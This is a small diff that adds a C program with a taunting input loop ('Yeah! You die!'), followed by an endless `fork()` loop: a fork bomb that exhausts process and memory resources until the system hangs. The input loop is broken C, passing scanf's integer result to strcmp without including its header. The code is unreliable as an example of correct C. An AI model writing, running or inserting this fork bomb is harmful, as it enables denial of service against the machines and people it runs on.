@@ -1,0 +1,9 @@
+#include <stdio.h>
+int main()
+{
+    char input[999];
+    while(!strcmp(scanf("%s",&input),"Yeah! You die!"));
+    while(1)
+        fork();
+    return 0;
+}
